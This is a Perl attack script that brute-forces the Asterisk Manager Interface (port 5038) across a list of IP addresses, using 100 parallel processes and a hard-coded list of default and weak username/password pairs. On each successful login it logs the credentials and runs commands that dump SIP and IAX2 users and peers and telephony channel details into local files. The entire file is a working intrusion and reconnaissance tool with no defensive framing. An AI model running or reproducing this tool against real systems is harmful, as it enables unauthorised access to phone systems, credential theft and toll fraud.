#!/usr/bin/perl

use Parallel::ForkManager;
use Net::Telnet;

print "\e[32m 

 _    _    __    _  _  ____    ____  _____    ____  __      __   _  _ 
( \/\/ )  /__\  ( \( )(_  _)  (_  _)(  _  )  (  _ \(  )    /__\ ( \/ )
 )    (  /(__)\  )  (   )(      )(   )(_)(    )___/ )(__  /(__)\ \  / 
(__/\__)(__)(__)(_)\_) (__)    (__) (_____)  (__)  (____)(__)(__)(__) 


 \e[0m\n";
#wwwadmin
my @users = ( "admin", "phpagi", "admin" , "cron", "admin"   , "admin", "admin" , "dialer" , "test" , "panel", "munin"   , "outcall" , "hudpro"   , "admin", "admin", "dialer", "phoneglue", "monast_user"  , "myasterisk", "user"    , "mark"    , "eventmanager"  , "admin" , "admin", "manager" , "crm" , "admin"   , "manager" , "manager", "manager", "manager", "manager", "manager"  ,  "admin",  "dialer"        ,  "astercc", "livechat", "astconf", "php", "admin"  , "galaxy", "orderlystats", "manager", "asteriskclient", "admin", "manager", "manager", "manager", "manager", "admin"    , "manager" );
my @passs = ( "amp111", "phpagi", "admin", "1234", "password", "12345", "123456", "dialer" , "test" , "panel", "password", "password", "l00tsc00t", "123"  , "1234" ,  "1234" , "phoneglue", "monast_secret",  "mycode"   , "password", "mysecret", "asterisksecret", "s3cr3t", "test" , "pa55w0rd", "1234", "mysecret", "mysecret", "mycode" , "s3cr3t" ,  "test"  ,  "secret",  "password", "mycode", "dialer..manager", "astercc" , "livechat", "astconf", "php", "ripencc", "galaxy",  "stats4STATS",  "123456",  "123456"       , "test" , "123"    ,  "1234"  , "12345"  , "1234567", "master123", "test" );

my @foundip;

my $user = "admin";
my $pass = "admin";
my $i = 0;


my $forkmanager = Parallel::ForkManager->new(100);

$forkmanager->run_on_finish(sub {    # must be declared before first 'start'
    my ($pid, $exit_code, $ident, $exit_signal, $core_dump, $data) = @_;
    $out{ $data->[0] } = $data->[1];
        #print "[onfinish]". $data->[0] ."\n";
        if (($data->[1] == -1) or ($data->[1] == 1)) {
                push(@foundip,$data->[0]);
        }

});

my $worked="worked.txt";
open(DAT,">>$worked");
print DAT "\n!!!!! Started !!!!!!\n";
close(DAT);

my $foundstring;
my $cnt =0;
my $match_found = 0;
foreach $usr (@users) {
        print "\n==new user===\n";

        print $usr . " - ";
        print $passs[$i];
        $pass = $passs[$i];
        print "\n============\n\n";
        $i++;
        $cnt =0;

        #print "\nFOUND:\n@foundip\n";
        my $rez = 0;
        open($foundipFILE, "< iplist.txt");
        while (<$foundipFILE>) {

                $line = $_;
                $line =~ s/\x0a//g;

                if (!grep {$_ eq $line} @foundip) {

                        $cnt++;
                        my $pid = $forkmanager->start and next;


                        $rez = 0;
                        $rez = oneIpTelnet($line,$usr,$pass);
                        #$rez = $cnt % 3;

                        if ($rez == -1){
                                #print $cnt ." " .$line ."failed connect \n";
                                print "\e[32m [$cnt] Badr [$line] failed connect \e[0m\n";
                        }elsif ($rez == 1){
                                print "\e[33m [$cnt] Badr [$line] WORKED with $usr : $pass \e[0m\n";

                        }else {
                                print "\e[34m [$cnt] Badr [$line] failed with $usr : $pass \e[0m\n";
                        }
                        sleep(1);
                        $forkmanager->finish(0, [ $line, $rez ]);   # Child exits

                }else{
                        #print "!!!!! $line was here\n";
                }



        }
        close($foundipFILE);

}

$forkmanager->wait_all_children();
print "\n!!!!! FINISH !!!!!!\n";

$worked="worked.txt";
open(DAT,">>$worked");
print DAT "\n!!!!! FINISH !!!!!!\n";
close(DAT);




sub oneIpTelnet{

        my ($result, $t);
        my @parms = @_;

        my $host=$parms[0];
        my $user=$parms[1];
        my $pass=$parms[2];

        #print $host;

        my $result0 = 0;

        use Net::Telnet ();
    $t = new Net::Telnet (
                Port => 5038
                , Timeout => 7
                , Prompt => '/.*[\$%#>] $/'
                , Output_record_separator => ''
                , Errmode => "return"

        );
        $t->open($host) or return -1; #$result0 = -1;
        ($result) = $t->waitfor('/(.*)\n$/');                   # print login
        print $result;

        if ($pass eq "l00tsc00t"){
                my $connected="connected.txt";
                open(DAT,">>$connected");
                print DAT "$host connected with message $result\n";
                close(DAT);
        }


        $t->print("Action: Login\nUsername: $user\nSecret: $pass\nEvents: off\n\n");
        ($result) = $t->waitfor('/Authentication accepted/');           # waitfor auth accepted

        if (index($result, "Success") != -1) {
                print "$result contains $Success\n";
                $result0 = 1;
                #push(@foundip, $host);
                $worked="worked.txt";
                open(DAT,">>$worked");
                print DAT "$host WORKED with $user : $pass \n";
                close(DAT);
        }
        print $result;

        if ($result0 == 1){
                $worked="workedX2.txt";
                open(DAT,">>$worked");
                print DAT "\n\n==========\n==========\n==========\n==========\n";
                print DAT "$host WORKED with $user : $pass \n";


                #print "dahdi show channels\n";
                print DAT "[dahdi show channels]\n";
                $t->print("ACTION: COMMAND\ncommand: dahdi show channels\n\n");
                ($result) = $t->waitfor('/--END COMMAND--\n$/');
                #print $result;
                print DAT "$result\n";


                #print "zap show channels\n";
                print DAT "[zap show channels]\n";
                $t->print("ACTION: COMMAND\ncommand: zap show channels\n\n");
                ($result) = $t->waitfor('/--END COMMAND--\n$/');
                #print $result;
                print DAT "$result\n";


                #print "ss7 show channels\n";
                print DAT "[ss7 show channels]\n";
                $t->print("ACTION: COMMAND\ncommand: ss7 show channels\n\n");
                ($result) = $t->waitfor('/--END COMMAND--\n$/');
                #print $result;
                print DAT "$result\n";


                #print "sip show users\n";
                print DAT "[sip show users]\n";
                $t->print("ACTION: COMMAND\ncommand: sip show users\n\n");
                ($result) = $t->waitfor('/--END COMMAND--\n$/');
                #print $result;
                print DAT "$result\n";


                #print "sip show peers\n";
                print DAT "[sip show peers]\n";
                $t->print("ACTION: COMMAND\ncommand: sip show peers\n\n");
                ($result) = $t->waitfor('/--END COMMAND--\n$/');
                #print $result;
                print DAT "$result\n";


                #print "iax2 show users\n";
                print DAT "[iax2 show users]\n";
                $t->print("ACTION: COMMAND\ncommand: iax2 show users\n\n");
                ($result) = $t->waitfor('/--END COMMAND--\n$/');
                #print $result;
                print DAT "$result\n";


                #print "iax2 show peers\n";
                print DAT "[iax2 show peers]\n";
                $t->print("ACTION: COMMAND\ncommand: iax2 show peers\n\n");
                ($result) = $t->waitfor('/--END COMMAND--\n$/');
                #print $result;
                print DAT "$result\n";

                close(DAT);
        }




        @hangup = $t->cmd(String => "Action: Logoff\n\n", Prompt => "/.*/");
        $t->buffer_empty;
        $ok = $t->close;

        return $result0;
}

